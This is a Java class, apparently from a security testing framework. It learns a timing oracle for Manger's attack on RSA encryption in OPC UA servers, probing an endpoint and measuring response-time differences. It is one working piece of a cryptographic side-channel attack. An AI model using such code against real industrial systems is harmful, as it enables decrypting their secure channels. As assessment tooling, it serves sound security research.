package attacks.manger.oracle.learner;

import attacks.manger.oracle.Oracle;
import attacks.manger.oracle.OracleException;
import attacks.manger.oracle.TimingOracle;
import attacks.manger.oracle.VictimProxy;
import attacks.manger.oracle.timing.DecisionRule;
import attacks.manger.oracle.timing.LinearDecisionRule;
import opcua.context.Endpoint;
import opcua.context.LocalKeyPair;
import opcua.encoding.EncodingException;
import reporting.entry.Entry;
import reporting.entry.Group;
import reporting.entry.ThrowableEntry;
import reporting.entry.ValueEntry;
import transport.SecureChannelUtil;

import java.io.IOException;

/**
 * Creates an oracle that leverages timing differences of an OPC UA implementation for Manger's attack
 */
public class TimingOracleLearner implements OracleLearner {

    private final int sampleSize;
    private final int rounds;
    private final LocalKeyPair localKeyPair;

    /**
     * Constructor
     * @param sampleSize How many samples are gathered per ciphertext. These samples are filtered using a percentile
     *                   determined at runtime.
     * @param rounds How many random ciphertext should be evaluated for "<B" and ">=BB"
     * @param localKeyPair Certificate and private key used for queries
     */
    public TimingOracleLearner(int sampleSize, int rounds, LocalKeyPair localKeyPair) {
        this.sampleSize = sampleSize;
        this.rounds = rounds;
        this.localKeyPair = localKeyPair;
    }

    @Override
    public LearningResult learn(Endpoint endpoint) throws OracleException {
        try {
            byte[] validCiphertext = SecureChannelUtil.generateEncryptedOpnRequest(endpoint, localKeyPair);
            VictimProxy victimProxy = new VictimProxy(endpoint, validCiphertext);
            LinearDecisionRule rule = new LinearDecisionRule(victimProxy, rounds, sampleSize);
            rule.learn();

            Entry report = new Group("TimingOracleLearner")
                    .addSubEntry(new ValueEntry<>("Successful", "n/a"))
                    .addSubEntry(new ValueEntry<>("Timing Difference", Math.abs(rule.getDecisionBoundary().getEmpMeanLessB() - rule.getDecisionBoundary().getEmpMeanGeqB())))
                    .addSubEntry(new ValueEntry<>("Empirical Mean for \"<B\"", rule.getDecisionBoundary().getEmpMeanLessB()))
                    .addSubEntry(new ValueEntry<>("Empirical Mean for \">=B\"", rule.getDecisionBoundary().getEmpMeanGeqB()))
                    .addSubEntry(new ValueEntry<>("Mean Empirical Standard Deviation", rule.getDecisionBoundary().getMeanEmpStandardDeviation()));
            Oracle oracle = new TimingOracle(rule);

            return new LearningResult(oracle, report);
        }
        catch (IOException | EncodingException e) {
            return createFailureResult("Unexpected exception", e);
        }
    }

    private static LearningResult createFailureResult(String reason) {
        Entry report = new Group("TimingOracleLearner")
                .addSubEntry(new ValueEntry<>("Successful", false))
                .addSubEntry(new ValueEntry<>("Reason", reason));
        return new LearningResult(report);
    }

    private static LearningResult createFailureResult(String reason, Throwable e) {
        Entry report = new Group("TimingOracleLearner")
                .addSubEntry(new ValueEntry<>("Successful", false))
                .addSubEntry(new ValueEntry<>("Reason", reason))
                .addSubEntry(new ThrowableEntry(e));
        return new LearningResult(report);
    }
}
